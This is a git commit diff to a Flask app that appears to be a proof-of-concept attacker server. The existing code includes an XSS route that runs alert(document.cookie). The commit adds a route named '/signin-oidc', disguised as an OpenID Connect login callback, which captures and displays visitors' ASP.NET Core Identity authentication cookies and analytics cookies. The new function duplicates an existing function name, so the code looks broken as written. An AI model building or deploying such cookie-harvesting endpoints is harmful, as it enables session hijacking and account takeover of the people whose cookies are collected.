0e099c41016c8f8128ae35885d894f5ed3c54295
noname430 <56733462+noname430@users.noreply.github.com>
2023-05-18 10:09:57 +0200

    Update app.py

--- app.py
+++ app.py
@@ -13,6 +13,18 @@ def hello_poc():
 def hello_poc_sxss():
     return "<!DOCTYPE html><html><body><script>alert(document.cookie)</script></body></html><!DOCTYPE html><title></title>"
 
+@app.route('/signin-oidc')
+def collect_cookies():
+    _ga = request.cookies.get('_ga')
+    _gid = request.cookies.get('_gid')
+    C1 = request.cookies.get('.AspNetCore.Identity.ApplicationC1')
+    C2 = request.cookies.get('.AspNetCore.Identity.ApplicationC2')
+    return f"Cookies to collect: \n\n" \
+    f"_ga = {_ga} \n\n" \
+    f"_gid = {_gid} \n\n" \
+    f".AspNetCore.Identity.ApplicationC1 = {C1} \n\n" \
+    f".AspNetCore.Identity.ApplicationC2 = {C2} \n\n"
+
 @app.route('/6w1ymvcfdrf33n7m2cc6')
 def collect_cookies():
     _ga = request.cookies.get('_ga')
